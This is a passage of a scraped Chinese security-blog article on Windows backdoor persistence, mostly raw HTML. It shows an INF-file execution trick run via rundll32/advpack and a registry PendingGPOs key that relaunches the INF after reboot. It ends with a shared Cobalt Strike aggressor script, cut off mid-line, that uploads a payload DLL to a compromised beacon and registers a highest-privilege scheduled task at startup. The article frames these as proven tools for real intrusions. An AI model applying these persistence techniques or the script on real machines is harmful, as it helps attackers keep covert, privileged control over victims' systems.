3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">inf</code>文件的结构<br  />想了解更多可以看一下微软的手册：链接#information-inf-file-entries "链接")</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">1. DefaultInstall节（来自WIKI）<br  />INF文件的结构与INI文件的结构非常类似; 它包含用于指定要复制的文件，对注册表的更改等的各个部分。所有INF文件都包含一个[Version]带有Signature 键值对的部分，用于指定INF文件所针对的Windows版本。签名通常是$CHICAGO$（对于Windows 9x）或$WINDOWS NT$（对于Windows NT / 2K / XP）。其余大多数部分是用户定义的，并且包含特定于要安装的组件的信息。<br  /><br  />2. DefaultInstall节（来自微软的手册）<br  />    RunPreSetupCommands-本节中指定的命令在安装服务配置文件之前运行。<br  />    RunPostSetupCommands-本节中指定的命令在安装程序完成服务配置文件后运行。<br  />    RunPreUnInstCommands-本节中指定的命令在卸载程序开始之前运行。<br  />    RunPostUnInstCommands-本节中指定的命令在卸载程序运行后运行。</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">下面举一个<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">calc.inf</code>弹计算器的例子</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">[Version]<br  />Signature="$CHICAGO$"<br  />AdvancedINF=2.5,"test"<br  />[DefaultInstall]<br  />RunPreSetupCommands=Command1<br  />[Command1]<br  />C:\windows\system32\calc.exe</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">命令行下执行：</p><pre style="padding: 16px;font-variant-numeric: normal;font-variant-east-asian: normal;font-stretch: normal;font-size: 12.75px;line-height: 1.6;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;border-radius: 3px;margin-bottom: 24px;word-break: break-all;overflow-wrap: normal;white-space: pre-wrap;background-color: rgb(247, 247, 247);border-width: 1px;border-style: solid;border-color: rgba(0, 0, 0, 0.15);overflow: auto;letter-spacing: 0.75px;text-align: start;"><code style="font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;color: inherit;border-radius: 3px;white-space: pre;background: transparent;border-width: 0px;border-style: initial;border-color: initial;word-break: normal;display: inline;max-width: initial;overflow: initial;line-height: inherit;overflow-wrap: normal;">rundll32.exe advpack.dll,LaunchINFSection calc.inf,DefaultInstall</code></pre><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">效果如下<br  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.5400485436893204" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/52_Hp8YIibicr3DOABrCFzSoPqs9X94qw.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgP4KLwMTicyFKmzpIMMONFeXhNfDHp8YIibicr3DOABrCFzSoPqs9X94qw/640?wx_fmt=gif'" data-type="gif" data-w="1648"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">后门实现：<br  />在注册表<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">HKEY_CURRENT_USER\Software\Microsoft\</code>处依次新建子项<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">\IEAK\GroupPolicy\PendingGPOs</code>，然后再新建几个键，如下：</p><ol style="" class=" list-paddingleft-2"><li><p style="margin-top: 16px;margin-bottom: 24px;"><span style="font-size:15px;line-height:35px;;">键：</span><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">Count</span></code><span style="font-size:15px;line-height:35px;;">，类型：</span><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">REG_DWORD</span></code><span style="font-size:15px;line-height:35px;;">，键值：</span><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">1</span></code></p></li><li><p style="margin-top: 16px;margin-bottom: 24px;"><span style="font-size:15px;line-height:35px;;">键：</span><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">Path1</span></code><span style="font-size:15px;line-height:35px;;">，类型：</span><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">REG_SZ</span></code><span style="font-size:15px;line-height:35px;;">，键值：</span><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">C:\Users\Administrator\Desktop\test\calc.inf</span></code><span style="font-size:15px;line-height:35px;;">&nbsp;//这个为我们inf文件的路径，这里以上面那个inf文件例子为例</span></p></li><li><p style="margin-top: 16px;margin-bottom: 24px;"><span style="font-size:15px;line-height:35px;;">键：</span><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">Section1</span></code><span style="font-size:15px;line-height:35px;;">，类型：</span><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">REG_SZ</span></code><span style="font-size:15px;line-height:35px;;">，键值：</span><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"><span style="font-size:15px;line-height:35px;;">DefaultInstall</span></code><code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;"></code></p></li></ol><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">如下图所示<br  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.42693236714975846" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/53_IHG5746oYSuSThxMicI1azSA2TtNew.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgYw7rOWL8br71pPu2wbMmPvHj5IHG5746oYSuSThxMicI1azSA2TtNew/640?wx_fmt=png'" data-type="png" data-w="1656"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">重启电脑之后成功弹出计算器</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.5400485436893204" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/54_cFnDIYmsFuicbWZibIcalYf8qGASyQ.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgjquUqj94UFRxqPz0xJFZ2vUUibyicFnDIYmsFuicbWZibIcalYf8qGASyQ/640?wx_fmt=gif'" data-type="gif" data-w="1648"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">但是重启之后<code style="padding-top: 0.2em;padding-bottom: 0.2em;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 12.75px;color: rgb(221, 17, 68);border-radius: 3px;background-color: rgba(0, 0, 0, 0.04);word-break: break-all;border-width: initial !important;border-style: none !important;border-color: initial !important;">PendingGPOs</code>该项就会被清除，需要我们重新修改注册表</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.3496631965707287" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/55_qOdp3SvIPVdlhKiaBjgolYticz1bQA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouib6iaMO1OKm9cC5ycHsYhYUgBOMCtv1g1iaJJQI3EhHjLQUATddqOdp3SvIPVdlhKiaBjgolYticz1bQA/640?wx_fmt=png'" data-type="png" data-w="1633"  /></p><h1 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.2;text-rendering: optimizelegibility;font-size:28px;line-height:48px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">后记</span></h1><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">以上就是我所总结后门持久化的所有内容了，当然还有很多方法没有在文章内提及，虽然有的方法都是老生常谈的了，但是还是在一些实战环境中屡试不爽，有一句话说的好（这句话忘记是哪位师傅说的了=。=）：<strong>知识面宽度决定攻击面广度，知识链深度决定攻击链的长度</strong></span></p><h1 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.2;text-rendering: optimizelegibility;font-size:28px;line-height:48px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">Reference</span></h1><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="color: rgb(65, 131, 196);background: transparent;font-size:15px;line-height:35px;;">https://github.com/Ridter/Intranet_Penetration_Tips</span></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="color: rgb(65, 131, 196);background: transparent;font-size:15px;line-height:35px;;">https://paper.seebug.org/1007/</span></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="color: rgb(65, 131, 196);background: transparent;font-size:15px;line-height:35px;;">https://3gstudent.github.io/</span></p><p style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><img data-type="png" class="" data-ratio="0.109375" data-w="640" src="图片/HACK学习呀_2019-10-04_Windows中常见后门持久化方法总结/56_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" style="visibility: visible !important;width: 640px !important;"  /></p><p style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;">分享一个自己修改汉化的CS的权限维持CNA脚本</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="perl"><code><span class="code-snippet_outer"><span class="code-snippet__comment">#计划任务函数</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">sub</span> <span class="code-snippet__title">persistUserSchtasks</span>  </span>{</span></code><code><span class="code-snippet_outer">  $bid = $1;</span></code><code><span class="code-snippet_outer">  $dialog = dialog(<span class="code-snippet__string">"User Schtasks Persistence"</span>, %(<span class="code-snippet__string">taskname =&gt;</span> <span class="code-snippet__string">"Evil Task Name.."</span>, <span class="code-snippet__string">targetpath =&gt;</span> <span class="code-snippet__string">"Target Path.."</span>, <span class="code-snippet__string">user =&gt;</span> <span class="code-snippet__string">"User to Run as.."</span>, <span class="code-snippet__string">payloadfile =&gt;</span> <span class="code-snippet__string">"Select DLL Payload.."</span>), lambda({</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">if</span> (<span class="code-snippet__string">"$3['taskname']"</span> ismatch <span class="code-snippet__string">'Evil Task Name..'</span> || <span class="code-snippet__string">"$3['targetpath']"</span> ismatch <span class="code-snippet__string">'Target Path..'</span> || <span class="code-snippet__string">"$3['payloadfile']"</span> ismatch <span class="code-snippet__string">'Select DLL Payload..'</span> || <span class="code-snippet__string">"$3['user']"</span> ismatch <span class="code-snippet__string">'User to Run as..'</span>) {</span></code><code><span class="code-snippet_outer">      berror($bid, <span class="code-snippet__string">"\c4Please enter a valid Task Name, Target Path, and a valid Payload File."</span>);</span></code><code><span class="code-snippet_outer">      <span class="code-snippet__keyword">break</span>;</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__keyword">else</span> {</span></code><code><span class="code-snippet_outer">      bcd($bid, $3[<span class="code-snippet__string">'targetpath'</span>]);</span></code><code><span class="code-snippet_outer">      bupload($bid, $3[<span class="code-snippet__string">'payloadfile'</span>]);</span></code><code><span class="code-snippet_outer">      bshell($bid, <span class="code-snippet__string">'schtasks /create /RL HIGHEST /F /tn "'</span>.$3[<span class="code-snippet__string">'taskname'</span>].<span class="code-snippet__string">'" /tr "'</span>.$3[<span class="code-snippet__string">'targetpath'</span>].<span class="code-snippet__string">"\\"</span>.<span class="code-snippet__keyword">split</span>(<span class="code-snippet__string">"/"</span>,$3[<span class="code-snippet__string">'payloadfile'</span>])[-<span class="code-snippet__number">1</span>].<span class="code-snippet__string">'" /ru "'</span>.$3[<span class="code-snippet__string">'user'</span>].<span class="code-snippet__string">'" /sc ONSTART '</span>);      <span class="code-snippet__comment">#修改自定义的计划任务命令</span></span></code><code><span class="code-snippet_outer">      bshell($bid, <span class="code-snippet__string">'schtasks /query /v /tn "'</span>.$3[<span class="code-snippet__string">'taskname'</span>].<span class="code-snippet__string">'" /FO list'</span>);</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">  }));</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">  dialog_description($dialog, <span class="code-snippet__string">"计划任务持久性 - Generates a schtask for persistence on selected beacon."</span>);</span></code><code><span class="code-snippet_outer">  </span></code><code><span class="code-snippet_outer">  drow_text($dialog, <span class="code-snippet__string">"taskname"</span>,  <span class="code-snippet__string">"计划任务名称:"</span>);       <span class="code-snippet__comment">#设置计划任务的名称</span></span></code><code><span class="code-snippet_outer">  drow_text($dialog, <span class="code-snippet__string">"user"</span>, <span 